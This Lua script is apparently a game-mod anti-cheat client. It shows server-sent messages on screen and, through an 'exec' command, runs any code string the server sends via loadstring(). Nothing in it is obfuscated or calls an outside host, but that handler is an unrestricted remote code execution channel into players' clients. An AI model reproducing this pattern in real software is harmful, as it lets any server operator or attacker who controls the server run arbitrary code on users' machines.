-- SZ Anti-Cheat Client: thin challenge executor
-- All logic comes from server via loadstring()

local TAG = "[SZ_AC]"

local function onServerCommand(module, command, args)
    if module ~= "SZ_AC" then return end

    if command == "msg" and args and args.text then
        SZ_AC_MSG_TEXT = args.text
        local code = [[
            local text = SZ_AC_MSG_TEXT or ""
            local w = 500
            local h = 200
            local sw = getCore():getScreenWidth()
            local sh = getCore():getScreenHeight()
            local x = (sw - w) / 2
            local y = (sh - h) / 2

            local panel = ISPanel:new(x, y, w, h)
            panel:initialise()
            panel:instantiate()
            panel.backgroundColor = {r=0, g=0, b=0, a=0.9}
            panel.borderColor = {r=0.8, g=0.2, b=0.2, a=1}
            panel:setAlwaysOnTop(true)
            panel:addToUIManager()

            local textY = 15
            local lines = {}
            for line in text:gmatch("[^|]+") do
                table.insert(lines, line)
            end
            for _, line in ipairs(lines) do
                local label = ISLabel:new(20, textY, 24, line, 1, 0.3, 0.3, 1, UIFont.Medium, true)
                label:initialise()
                label:instantiate()
                panel:addChild(label)
                textY = textY + 28
            end

            panel:setHeight(textY + 15)
            panel:setY((sh - panel:getHeight()) / 2)
            SZ_AC_MSG_TEXT = nil
        ]]
        local func = loadstring(code)
        if func then pcall(func) end
        return
    end

    if command == "exec" and args and args.code then
        local func, err = loadstring(args.code)
        if func then
            local ok, result = pcall(func)
            if not ok then
                print(TAG .. " exec error: " .. tostring(result))
            end
        else
            print(TAG .. " loadstring error: " .. tostring(err))
        end
    end
end

local function onGameStart()
    Events.OnServerCommand.Add(onServerCommand)
end

Events.OnGameStart.Add(onGameStart)
